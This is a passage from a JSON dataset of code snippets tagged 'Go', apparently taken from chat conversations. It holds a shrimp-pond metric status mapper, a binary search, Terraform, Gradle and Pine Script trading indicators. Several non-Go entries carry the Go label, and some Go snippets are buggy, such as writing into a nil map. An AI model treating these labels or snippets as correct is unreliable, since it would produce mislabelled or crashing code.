strconv.ParseFloat(splitVal[0], 64)\n\t\t\t\tsConv, _ := strconv.ParseFloat(splitVal[1], 64)\n\t\t\t\tchecker = checker && (fConv <= convRaw && sConv >= convRaw)\n\t\t\t}\n\t\t}\n\n\t\tif checker {\n\t\t\treturn refValue[\"status\"].(string)\n\t\t}\n\t}\n\n\treturn \"unknown\"\n}\n\nfunc MetricReadStatusMapper(sReference interface{}, dataOld string, dataNew string) string {\n\tvar sReferences []map[string]interface{}\n\tjson.Unmarshal([]byte(sReference.(string)), &sReferences)\n\tuserReadStatus := \"true,true,true,true,true,true,true,true,true\"\n\n\tdataOldSplit := strings.Split(dataOld, \",\")\n\tdataNewSplit := strings.Split(dataNew, \",\")\n\tstatusSplit := strings.Split(userReadStatus, \",\")\n\n\tfor index, value := range sReferences {\n\t\tkey := ShrimpEstateMetricKey[value[\"key\"].(string)]\n\t\tkeyIndex := key.(int)\n\n\t\tstatusDataOld := getStatusData(value, dataOldSplit[keyIndex])\n\t\tstatusDataNew := getStatusData(value, dataNewSplit[keyIndex])\n\n\t\tif statusDataOld != statusDataNew {\n\t\t\tstatusSplit[keyIndex] = \"false\"\n\t\t} else if statusDataOld == statusDataNew && statusDataOld != \"good\" {\n\t\t\tstatusSplit[keyIndex] = \"false\"\n\t\t}\n\t}\n\n\tjoin := strings.Join(statusSplit, \",\")\n\tuserReadStatus = join\n\treturn userReadStatus\n}",
    "filename": "78e83defc1026508dbdcf8a9290889cb_1.go"
  },
  {
    "conversation_hash": "e970114f31197bc69764dc2f8a01a711",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc binarySearch(arr []int, target int) int {\n    left := 0\n    right := len(arr) - 1\n\n    for left <= right {\n        mid := left + (right - left) / 2\n\n        if arr[mid] == target {\n            return mid\n        } else if arr[mid] < target {\n            left = mid + 1\n        } else {\n            right = mid - 1\n        }\n    }\n\n    return -1\n}\n\nfunc main() {\n    arr := []int{1, 3, 5, 7, 9}\n    target := 5\n    result := binarySearch(arr, target)\n\n    if result == -1 {\n        fmt.Println(\"Target not found\")\n    } else {\n        fmt.Printf(\"Target found at index %d\\n\", result)\n    }\n}",
    "filename": "e970114f31197bc69764dc2f8a01a711_1.go"
  },
  {
    "conversation_hash": "b1253309b2c05f5e2ced3e0b928b7a09",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"Livermore Method\", shorttitle = \"LM\", overlay=true)\n\n// Parameters\nbreakoutLength = input(20, title = \"Breakout Length\", type = input.integer)\natrLength = input(14, title = \"ATR Length\", type = input.integer)\nmultiplier = input(3, title = \"ATR Multiplier\", type = input.integer)\n\n// Calculate ATR\natr = atr(atrLength)\n\n// Define trendlines\nhighestHigh = highest(high, breakoutLength)\nlowestLow = lowest(low, breakoutLength)\n\n// Buy and Sell signals\nbuySignal = crossover(close, highestHigh)\nsellSignal = crossunder(close, lowestLow)\n\n// Plot\nplot(highestHigh, color=color.green, linewidth=2)\nplot(lowestLow, color=color.red, linewidth=2)\n\nbgcolor(buySignal ? color.green : na, transp=90)\nbgcolor(sellSignal ? color.red : na, transp=90)\n\n// Position management\nchandelierStop = highestHigh - multiplier * atr\n\nlongStopLoss = float(na)\nlongStopLoss := buySignal ? chandelierStop : sellSignal ? na : longStopLoss[1]\n\nplot(longStopLoss, color = color.red, style = plot.style_linebr, linewidth = 2)\n\n// Alerts\nalertcondition(buySignal, \"Buy Signal\", \"Long signal\")\nalertcondition(sellSignal, \"Sell Signal\", \"Short signal\")",
    "filename": "b1253309b2c05f5e2ced3e0b928b7a09_0.go"
  },
  {
    "conversation_hash": "b1253309b2c05f5e2ced3e0b928b7a09",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"Livermore Method with EMA Stop\", shorttitle = \"LM-EMA\", overlay=true)\n\n// Parameters\nbreakoutLength = input(20, title = \"Breakout Length\", type = input.integer)\natrLength = input(14, title = \"ATR Length\", type = input.integer)\nmultiplier = input(3, title = \"ATR Multiplier\", type = input.integer)\nemaLength = input(10, title = \"EMA Length\", type = input.integer)\n\n// Calculate ATR & EMA\natr = atr(atrLength)\nema = ema(close, emaLength)\n\n// Define trendlines\nhighestHigh = highest(high, breakoutLength)\nlowestLow = lowest(low, breakoutLength)\n\n// Buy and Sell signals\nbuySignal = crossover(close, highestHigh)\nsellSignal = crossunder(close, lowestLow)\n\n// Plot\nplot(highestHigh, color=color.green, linewidth=2)\nplot(lowestLow, color=color.red, linewidth=2)\n\nbgcolor(buySignal ? color.green : na, transp=90)\nbgcolor(sellSignal ? color.red : na, transp=90)\n\n// Position management\nchandelierStop = highestHigh - multiplier * atr\nemaStop = ema\n\nlongStopLoss = float(na)\nlongStopLoss := buySignal ? chandelierStop : sellSignal ? na : min(longStopLoss[1], emaStop)\n\nplot(longStopLoss, color = color.red, style = plot.style_linebr, linewidth = 2)\n\n// Alerts\nalertcondition(buySignal, \"Buy Signal\", \"Long signal\")\nalertcondition(sellSignal, \"Sell Signal\", \"Short signal\")",
    "filename": "b1253309b2c05f5e2ced3e0b928b7a09_1.go"
  },
  {
    "conversation_hash": "b1253309b2c05f5e2ced3e0b928b7a09",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"Livermore Method with EMA Stop and Sell Conditions\", shorttitle = \"LM-EMA-SC\", overlay=true)\n\n// Parameters\nbreakoutLength = input(20, title = \"Breakout Length\", type = input.integer)\natrLength = input(14, title = \"ATR Length\", type = input.integer)\nmultiplier = input(3, title = \"ATR Multiplier\", type = input.integer)\nemaLength = input(10, title = \"EMA Length\", type = input.integer)\n\n// Calculate ATR & EMA\natr = atr(atrLength)\nema = ema(close, emaLength)\n\n// Define trendlines\nhighestHigh = highest(high, breakoutLength)\nlowestLow = lowest(low, breakoutLength)\n\n// Buy and Sell signals\nbuySignal = crossover(close, highestHigh)\nsellSignal = crossunder(close, lowestLow)\n\n// Position management\nchandelierStop = highestHigh - multiplier * atr\nemaStop = ema\n\nvar float buyDayLow = na\nif buySignal\n    buyDayLow := low\nelse\n    buyDayLow := buyDayLow[1]\n\nsellCondition1 = close < buyDayLow\nsellCondition2 = close < emaStop\nsellSignal = sellCondition1 or sellCondition2\n\nlongStopLoss = float(na)\nlongStopLoss := buySignal ? chandelierStop : sellSignal ? na : min(longStopLoss[1], emaStop)\n\nplot(highestHigh, color=color.green, linewidth=2)\nplot(lowestLow, color=color.red, linewidth=2)\n\nbgcolor(buySignal ? color.green : na, transp=90)\nbgcolor(sellSignal ? color.red : na, transp=90)\n\nplot(longStopLoss, color = color.red, style = plot.style_linebr, linewidth = 2)\n\n// Alerts\nalertcondition(buySignal, \"Buy Signal\", \"Long signal\")\nalertcondition(sellSignal, \"Sell Signal\", \"Short signal\")",
    "filename": "b1253309b2c05f5e2ced3e0b928b7a09_2.go"
  },
  {
    "conversation_hash": "b1253309b2c05f5e2ced3e0b928b7a09",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"Livermore Method with EMA Stop and Sell Conditions\", shorttitle = \"LM-EMA-SC\", overlay=true)\n\n// Parameters\nbreakoutLength = input(20, title = \"Breakout Length\", type = input.integer)\natrLength = input(14, title = \"ATR Length\", type = input.integer)\nmultiplier = input(3, title = \"ATR Multiplier\", type = input.integer)\nemaLength = input(10, title = \"EMA Length\", type = input.integer)\n\n// Calculate ATR & EMA\natr = atr(atrLength)\nema = ema(close, emaLength)\n\n// Define trendlines\nhighestHigh = highest(high, breakoutLength)\nlowestLow = lowest(low, breakoutLength)\n\n// Buy and Sell signals\nbuySignal = crossover(close, highestHigh)\nsellSignal = crossunder(close, lowestLow)\n\n// Position management\nchandelierStop = highestHigh - multiplier * atr\nemaStop = ema\n\nvar float buyDayLow = na\nif buySignal\n    buyDayLow := low\nelse\n    buyDayLow := buyDayLow[1]\n\nsellCondition1 = close < buyDayLow\nsellCondition2 = close < emaStop\nsellSignal = sellCondition1 or sellCondition2\n\nlongStopLoss = float(na)\nlongStopLoss := buySignal ? chandelierStop : sellSignal ? na : min(longStopLoss[1], emaStop)\n\nplot(highestHigh, color=color.green, linewidth=2)\nplot(lowestLow, color=color.red, linewidth=2)\n\nbgcolor(buySignal ? color.green : na, transp=90)\nbgcolor(sellSignal ? color.red : na, transp=90)\n\nplot(longStopLoss, color=color.red, style=plot.style_linebr, linewidth=2)\n\n// Alerts\nalertcondition(buySignal, title=\"Buy Signal\", message=\"Long signal\")\nalertcondition(sellSignal, title=\"Sell Signal\", message=\"Short signal\")",
    "filename": "b1253309b2c05f5e2ced3e0b928b7a09_3.go"
  },
  {
    "conversation_hash": "ac03268dfee79b5ee5b57300cf37be2c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "resource \"google_logging_metric\" \"svc_errors_tf\" {\n  name        = \"svc_errors_tf\"\n  description = \"Log-based metric for error logs\"\n\n  filter = \"resource.type=\\\"k8s_container\\\" AND log_entry.severity=\\\"ERROR\\\"\"\n\n  metric_descriptor {\n    metric_kind = \"DELTA\"\n    value_type  = \"INT64\"\n    \n    labels {\n      key         = \"severity\"\n      value_type  = \"STRING\"\n      description = \"Log severity of the error\"\n    }\n  }\n}",
    "filename": "ac03268dfee79b5ee5b57300cf37be2c_0.go"
  },
  {
    "conversation_hash": "3213a23fa874b1d30ffe401492319011",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "resource \"google_monitoring_alert_policy\" \"example\" {\n  display_name = \"Error rate alert\"\n  combiner     = \"OR\"\n  conditions {\n    display_name = \"Error rate condition\"\n    condition_threshold {\n      filter = \"metric.type=\\\"logging.googleapis.com/user/error_rate\\\" resource.type=\\\"k8s_container\\\"\"\n      duration = \"60s\"\n      comparison = \"COMPARISON_GT\"\n      threshold_value = 0.0\n      trigger {\n        count = 1\n      }\n      aggregations {\n        alignment_period   = \"60s\"\n        per_series_aligner = \"ALIGN_DELTA\"\n      }\n    }\n  }\n  settings {\n    notification_channels {\n      channel = google_monitoring_notification_channel.example.name\n    }\n    no_data_timeframe = 120\n  }\n}\n\nresource \"google_monitoring_notification_channel\" \"example\" {\n  // Create a notification channel according to your needs\n  type = \"email\"\n  labels = {\n    email_address = \"your-email@example.com\"\n  }\n  display_name = \"Email notification channel\"\n}",
    "filename": "3213a23fa874b1d30ffe401492319011_1.go"
  },
  {
    "conversation_hash": "7978e8bfca066bb31c361c0764c2328c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nfunc main() {\n    // 设置要运行的可执行文件和参数\n    command := exec.Command(\"cmd\", \"/C\", \"start /b example.exe\")\n    // 设置工作目录\n    command.Dir = \"C:/Program Files/example\"\n    // 后台运行\n    if err := command.Start(); err != nil {\n        fmt.Println(\"Error:\", err)\n        return\n    }\n}",
    "filename": "7978e8bfca066bb31c361c0764c2328c_0.go"
  },
  {
    "conversation_hash": "96db995f5c617585208b2997412e4f3a",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    compileSdkVersion 30\n\n    defaultConfig {\n        applicationId \"com.example.myapp\"\n        minSdkVersion 21\n        targetSdkVersion 30\n        versionCode flutterVersionCode.toInteger()\n        versionName flutterVersionName\n        multiDexEnabled true\n        testInstrumentationRunner \"androidx.test.runner.AndroidJUnitRunner\"\n    }\n\n    buildTypes {\n        release {\n            minifyEnabled true\n            signingConfig signingConfigs.release\n            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'\n        }\n    }\n}",
    "filename": "96db995f5c617585208b2997412e4f3a_3.go"
  },
  {
    "conversation_hash": "8f5dd30f55c0f66a26df92069d685fdd",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "terraform {\n  backend \"azurerm\" {\n    resource_group_name   = \"my-resource-group\"\n    storage_account_name  = \"my-terraform-state\"\n    container_name        = \"my-state-container\"\n    key                   = \"my-terraform-state.tfstate\"\n  }\n}",
    "filename": "8f5dd30f55c0f66a26df92069d685fdd_1.go"
  },
  {
    "conversation_hash": "0435b784784123efe246160161388246",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "for idx, parValue := range parameter {\n    fmt.Printf(\"Index: %d, parValue: %v\\n\", idx, parValue)\n    convRaw, _ := strconv.ParseFloat(splitDataOld, 64)\n    // ... kode Anda yang lain ...\n}",
    "filename": "0435b784784123efe246160161388246_0.go"
  },
  {
    "conversation_hash": "0435b784784123efe246160161388246",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func getStatus(sReferences []map[string]interface{}, dataValue string) string {\n\tvar status string\n\tvar checker bool\n\n\tfor _, sReference := range sReferences {\n\t\tvar reference []map[string]interface{}\n\t\tbyteReference, _ := json.Marshal(sReference[\"reference\"])\n\t\tjson.Unmarshal(byteReference, &reference)\n\n\t\tfor _, refValue := range reference {\n\t\t\tvar parameter []map[string]interface{}\n\t\t\tbyteParameter, _ := json.Marshal(refValue[\"parameter\"])\n\t\t\tjson.Unmarshal(byteParameter, &parameter)\n\n\t\t\tfor _, parValue := range parameter {\n\t\t\t\tconvRaw, _ := strconv.ParseFloat(dataValue, 64)\n\t\t\t\tif !checker {\n\t\t\t\t\tstatus = refValue[\"status\"].(string)\n\t\t\t\t\tswitch parValue[\"type\"] {\n\t\t\t\t\tcase \"greater-than\":\n\t\t\t\t\t\tconv, _ := strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\t\t\tif convRaw > conv {\n\t\t\t\t\t\t\tchecker = true\n\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t}\n\t\t\t\t\tcase \"lower-than\":\n\t\t\t\t\t\tconv, _ := strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\t\t\tif convRaw < conv {\n\t\t\t\t\t\t\tchecker = true\n\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t}\n\t\t\t\t\tcase \"between\":\n\t\t\t\t\t\tsplitVal := strings.Split(parValue[\"value\"].(string), \"-\")\n\t\t\t\t\t\tfConv, _ := strconv.ParseFloat(splitVal[0], 64)\n\t\t\t\t\t\tsConv, _ := strconv.ParseFloat(splitVal[1], 64)\n\t\t\t\t\t\tif fConv <= convRaw && sConv >= convRaw {\n\t\t\t\t\t\t\tchecker = true\n\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\treturn status\n}\n\nfunc MetricReadStatusMapper(sReference interface{}, dataOld string, dataNew string, userReadStatus string) string {\n\n\tvar sReferences []map[string]interface{}\n\tjson.Unmarshal([]byte(sReference.(string)), &sReferences)\n\n\tsplit := strings.Split(userReadStatus, \",\")\n\tfor _, value := range sReferences {\n\t\tkey := ShrimpEstateMetricKey[value[\"key\"].(string)]\n\n\t\tvar statusDataOld string\n\t\tvar statusDataNew string\n\n\t\tkeyIndex := key.(int)\n\t\tsplitDataOld := strings.Split(dataOld, \",\")[keyIndex]\n\t\tsplitDataOld = strings.ReplaceAll(splitDataOld, \"\\\"\", \"\")\n\t\tsplitDataOld = strings.TrimSpace(splitDataOld)\n\t\tstatusDataOld = getStatus(sReferences, splitDataOld)\n\n\t\tsplitDataNew := strings.Split(dataNew, \",\")[keyIndex]\n\t\tsplitDataNew = strings.ReplaceAll(splitDataNew, \"\\\"\", \"\")\n\t\tsplitDataNew = strings.TrimSpace(splitDataNew)\n\t\tstatusDataNew = getStatus(sReferences, splitDataNew)\n\n\t\tif statusDataOld != statusDataNew {\n\t\t\tsplit[keyIndex] = \"false\"\n\t\t}\n\t}\n\n\tjoin := strings.Join(split, \",\")\n\tuserReadStatus = join\n\treturn userReadStatus\n}",
    "filename": "0435b784784123efe246160161388246_1.go"
  },
  {
    "conversation_hash": "0435b784784123efe246160161388246",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func getStatus(sReferences []map[string]interface{}, dataValue string) string {\n\tvar status string\n\tvar checker bool\n\n\tfor _, value := range sReferences {\n\t\tvar reference []map[string]interface{}\n\t\tbyteReference, _ := json.Marshal(value[\"reference\"])\n\t\tjson.Unmarshal(byteReference, &reference)\n\n\t\tfor _, refValue := range reference {\n\t\t\tvar parameter []map[string]interface{}\n\t\t\tbyteParameter, _ := json.Marshal(refValue[\"parameter\"])\n\t\t\tjson.Unmarshal(byteParameter, &parameter)\n\n\t\t\tfor _, parValue := range parameter {\n\t\t\t\tconvRaw, _ := strconv.ParseFloat(dataValue, 64)\n\t\t\t\tif !checker {\n\t\t\t\t\tstatus = refValue[\"status\"].(string)\n\t\t\t\t\tswitch parValue[\"type\"] {\n\t\t\t\t\tcase \"greater-than\":\n\t\t\t\t\t\tconv, _ := strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\t\t\tif convRaw > conv {\n\t\t\t\t\t\t\tchecker = true\n\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t}\n\t\t\t\t\tcase \"lower-than\":\n\t\t\t\t\t\tconv, _ := strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\t\t\tif convRaw < conv {\n\t\t\t\t\t\t\tchecker = true\n\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t}\n\t\t\t\t\tcase \"between\":\n\t\t\t\t\t\tsplitVal := strings.Split(parValue[\"value\"].(string), \"-\")\n\t\t\t\t\t\tfConv, _ := strconv.ParseFloat(splitVal[0], 64)\n\t\t\t\t\t\tsConv, _ := strconv.ParseFloat(splitVal[1], 64)\n\t\t\t\t\t\tif fConv <= convRaw && sConv >= convRaw {\n\t\t\t\t\t\t\tchecker = true\n\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\t\n\treturn status\n}\n\n//Sisanya kode tidak perlu diubah",
    "filename": "0435b784784123efe246160161388246_2.go"
  },
  {
    "conversation_hash": "0435b784784123efe246160161388246",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func getStatus(sReferences []map[string]interface{}, dataValue string) string {\n\tvar status string\n\t\n\tfor _, sReference := range sReferences {\n\t\tvar reference []map[string]interface{}\n\t\tbyteReference, _ := json.Marshal(sReference[\"reference\"])\n\t\tjson.Unmarshal(byteReference, &reference)\n\t\t\n\t\tvar checker bool = false\n\t\tfor _, refValue := range reference {\n\t\t\tvar parameter []map[string]interface{}\n\t\t\tbyteParameter, _ := json.Marshal(refValue[\"parameter\"])\n\t\t\tjson.Unmarshal(byteParameter, &parameter)\n\t\t\t\n\t\t\tfor _, parValue := range parameter {\n\t\t\t\tconvRaw, _ := strconv.ParseFloat(dataValue, 64)\n\t\t\t\tif !checker {\n\t\t\t\t\tstatus = refValue[\"status\"].(string)\n\t\t\t\t\tswitch parValue[\"type\"] {\n\t\t\t\t\tcase \"greater-than\":\n\t\t\t\t\t\tconv, _ := strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\t\t\tif convRaw > conv {\n\t\t\t\t\t\t\tchecker = true\n\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t}\n\t\t\t\t\tcase \"lower-than\":\n\t\t\t\t\t\tconv, _ := strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\t\t\tif convRaw < conv {\n\t\t\t\t\t\t\tchecker = true\n\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t}\n\t\t\t\t\tcase \"between\":\n\t\t\t\t\t\tsplitVal := strings.Split(parValue[\"value\"].(string), \"-\")\n\t\t\t\t\t\tfConv, _ := strconv.ParseFloat(splitVal[0], 64)\n\t\t\t\t\t\tsConv, _ := strconv.ParseFloat(splitVal[1], 64)\n\t\t\t\t\t\tif fConv <= convRaw && sConv >= convRaw {\n\t\t\t\t\t\t\tchecker = true\n\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\treturn status\n}",
    "filename": "0435b784784123efe246160161388246_3.go"
  },
  {
    "conversation_hash": "139a4dad6ddb996a3327390d64d1f0e2",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func getStatus(sReferenceMap map[string]interface{}, key string, dataValue string) string {\n\tvar status string\n\tvar checker bool\n\n\treference, ok := sReferenceMap[key].([]interface{})\n\tif !ok {\n\t\treturn status\n\t}\n\n\tchecker = false\n\tfor _, refValue := range reference {\n\t\trefValueMap := refValue.(map[string]interface{})\n\t\tvar parameter []map[string]interface{}\n\t\tbyteParameter, _ := json.Marshal(refValueMap[\"parameter\"])\n\t\tjson.Unmarshal(byteParameter, &parameter)\n\n\t\tstatus = refValueMap[\"status\"].(string)\n\t\tvar convRaw, conv float64\n\n\t\tfor _, parValue := range parameter {\n\t\t\tconvRaw, _ = strconv.ParseFloat(dataValue, 64)\n\t\t\tswitch parValue[\"type\"] {\n\t\t\tcase \"greater-than\":\n\t\t\t\tconv, _ = strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\tif convRaw > conv {\n\t\t\t\t\tchecker = true\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\tcase \"lower-than\":\n\t\t\t\tconv, _ = strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\tif convRaw < conv {\n\t\t\t\t\tchecker = true\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\tcase \"between\":\n\t\t\t\tsplitVal := strings.Split(parValue[\"value\"].(string), \"-\")\n\t\t\t\tfConv, _ := strconv.ParseFloat(splitVal[0], 64)\n\t\t\t\tsConv, _ := strconv.ParseFloat(splitVal[1], 64)\n\t\t\t\tif fConv <= convRaw && sConv >= convRaw {\n\t\t\t\t\tchecker = true\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tif checker {\n\t\t\tbreak\n\t\t}\n\t}\n\n\treturn status\n}",
    "filename": "139a4dad6ddb996a3327390d64d1f0e2_0.go"
  },
  {
    "conversation_hash": "139a4dad6ddb996a3327390d64d1f0e2",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "var sReferenceMap map[string]interface{}\nfor _, sValue := range sReferences {\n\tkey := sValue[\"key\"].(string)\n\tsReferenceMap[key] = sValue[\"reference\"]\n}",
    "filename": "139a4dad6ddb996a3327390d64d1f0e2_1.go"
  },
  {
    "conversation_hash": "139a4dad6ddb996a3327390d64d1f0e2",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"strconv\"\n\t\"strings\"\n)\n\nfunc getStatus(sReferenceMap map[string]interface{}, key string, dataValue string) string {\n\tvar status string\n\tvar checker bool\n\n\treference, ok := sReferenceMap[key].([]interface{})\n\tif !ok {\n\t\treturn status\n\t}\n\n\tchecker = false\n\tfor _, refValue := range reference {\n\t\trefValueMap := refValue.(map[string]interface{})\n\t\tvar parameter []map[string]interface{}\n\t\tbyteParameter, _ := json.Marshal(refValueMap[\"parameter\"])\n\t\tjson.Unmarshal(byteParameter, &parameter)\n\n\t\tstatus = refValueMap[\"status\"].(string)\n\t\tvar convRaw, conv float64\n\n\t\tfor _, parValue := range parameter {\n\t\t\tconvRaw, _ = strconv.ParseFloat(dataValue, 64)\n\t\t\tswitch parValue[\"type\"] {\n\t\t\tcase \"greater-than\":\n\t\t\t\tconv, _ = strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\tif convRaw > conv {\n\t\t\t\t\tchecker = true\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\tcase \"lower-than\":\n\t\t\t\tconv, _ = strconv.ParseFloat(parValue[\"value\"].(string), 64)\n\t\t\t\tif convRaw < conv {\n\t\t\t\t\tchecker = true\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\tcase \"between\":\n\t\t\t\tsplitVal := strings.Split(parValue[\"value\"].(string), \"-\")\n\t\t\t\tfConv, _ := strconv.ParseFloat(splitVal[0], 64)\n\t\t\t\tsConv, _ := strconv.ParseFloat(splitVal[1], 64)\n\t\t\t\tif fConv <= convRaw && sConv >= convRaw {\n\t\t\t\t\tchecker = true\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tif checker {\n\t\t\tbreak\n\t\t}\n\t}\n\n\treturn status\n}\n\nfunc MetricReadStatusMapper(sReference interface{}, dataOld string, dataNew string, userReadStatus string) string {\n\n\tvar sReferences []map[string]interface{}\n\tjson.Unmarshal([]byte(sReference.(string)), &sReferences)\n\n\t// Create a map for easy access to the sReferences properties\n\tvar sReferenceMap map[string]interface{}\n\tfor _, sValue := range sReferences {\n\t\tkey := sValue[\"key\"].(string)\n\t\tsReferenceMap[key] = sValue[\"reference\"]\n\t}\n\n\tsplit := strings.Split(userReadStatus, \",\")\n\tfor _, value := range sReferences {\n\t\tkey := ShrimpEstateMetricKey[value[\"key\"].(string)]\n\t\tvar statusDataOld string\n\t\tvar statusDataNew string\n\n\t\tkeyIndex := key.(int)\n\t\tsplitDataOld := strings.Split(dataOld, \",\")[keyIndex]\n\t\tsplitDataOld = strings.ReplaceAll(splitDataOld, \"\\\"\", \"\")\n\t\tsplitDataOld = strings.TrimSpace(splitDataOld)\n\t\tstatusDataOld = getStatus(sReferenceMap, value[\"key\"].(string), splitDataOld)\n\n\t\tsplitDataNew := strings.Split(dataNew, \",\")[keyIndex]\n\t\tsplitDataNew = strings.ReplaceAll(splitDataNew, \"\\\"\", \"\")\n\t\tsplitDataNew = strings.TrimSpace(splitDataNew)\n\t\tstatusDataNew = getStatus(sReferenceMap, value[\"key\"].(string), splitDataNew)\n\n\t\tif statusDataOld != statusDataNew {\n\t\t\tsplit[keyIndex] = \"false\"\n\t\t}\n\t}\n\n\tjoin := strings.Join(split, \",\")\n\tuserReadStatus = join\n\treturn userReadStatus\n}\n\nvar ShrimpEstateMetricKey = map[string]interface{}{\n\t\"water-temperature\": 0,\n\t\"dissolved-oxygen\":  1,\n\t\"turbidity\":         2,\n\t\"water-ph\":          3,\n\t\"air-temperature\":   4,\n\t\"air-humidity\":      5,\n\t\"tds\":               8,\n}\n\n\nfunc main() {\n\t// Your test data here\n}",
    "filename": "139a4dad6ddb996a3327390d64d1f0e2_3.go"
  },
  {
    "conversation_hash": "5b68c3e69f59364d1c588d62c4ce5f60",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "for _, value := range sReferences {\n    key := ShrimpEstateMetricKey[value[\"key\"].(string)]\n\n    fmt.Println(\"key:\", key)\n    fmt.Println(\"value:\", value[\"key\"])\n\n    var statusDataOld string\n    var statusDataNew string\n\n    keyIndex := key.(int)\n    splitDataOld := strings.Split(dataOld, \",\")[keyIndex]\n    splitDataOld = strings.ReplaceAll(splitDataOld, \"\\\"\", \"\")\n    splitDataOld = strings.TrimSpace(splitDataOld)\n    statusDataOld = getStatus(sReferences, splitDataOld)\n\n    splitDataNew := strings.Split(dataNew, \",\")[keyIndex]\n    splitDataNew = strings.ReplaceAll(splitDataNew, \"\\\"\", \"\")\n    splitDataNew = strings.TrimSpace(splitDataNew)\n    statusDataNew = getStatus(sReferences, splitDataNew)\n\n    if statusDataOld != statusDataNew {\n        split[keyIndex] = \"false\"\n    }\n}",
    "filename": "5b68c3e69f59364d1c588d62c4ce5f60_0.go"
  },
  {
    "conversation_hash": "5b68c3e69f59364d1c588d62c4ce5f60",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "func MetricReadStatusMapper(sReference interface{}, dataOld string, dataNew string, userReadStatus string) string {\n\n\tvar sReferences []map[string]interface{}\n\tjson.Unmarshal([]byte(sReference.(string)), &sReferences)\n\n\tsplit := strings.Split(userReadStatus, \",\")\n\tdataOldSplit := strings.Split(dataOld, \",\")\n\tdataNewSplit := strings.Split(dataNew, \",\")\n\n\tfor _, value := range sReferences {\n\t\tkey := ShrimpEstateMetricKey[value[\"key\"].(string)].(int)\n\n\t\tfmt.Println(\"key:\", key, \"value:\", value[\"key\"])\n\n\t\tvar statusDataOld string\n\t\tvar statusDataNew string\n\n\t\tif key < len(dataOldSplit) {\n\t\t\tsplitDataOld := strings.ReplaceAll(dataOldSplit[key], \"\\\"\", \"\")\n\t\t\tsplitDataOld = strings.TrimSpace(splitDataOld)\n\t\t\tstatusDataOld = getStatus(sReferences, splitDataOld)\n\t\t} else {\n\t\t\tstatusDataOld = \"\"\n\t\t}\n\n\t\tif key < len(dataNewSplit) {\n\t\t\tsplitDataNew := strings.ReplaceAll(dataNewSplit[key], \"\\\"\", \"\")\n\t\t\tsplitDataNew = strings.TrimSpace(splitDataNew)\n\t\t\tstatusDataNew = getStatus(sReferences, splitDataNew)\n\t\t} else {\n\t\t\tstatusDataNew = \"\"\n\t\t}\n\n\t\tif statusDataOld != statusDataNew {\n\t\t\tif key < len(split) {\n\t\t\t\tsplit[key] = \"false\"\n\t\t\t} else {\n\t\t\t\tsplit = append(split, \"false\") // add a new element if the key is greater than the length of split\n\t\t\t}\n\t\t}\n\t}\n\n\tjoin := strings.Join(split, \",\")\n\tuserReadStatus = join\n\treturn userReadStatus\n}",
    "filename": "5b68c3e69f59364d1c588d62c4ce5f60_6.go"
  },
  {
    "conversation_hash": "1692eda8d80f6b5082f5b9faffe3c91e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
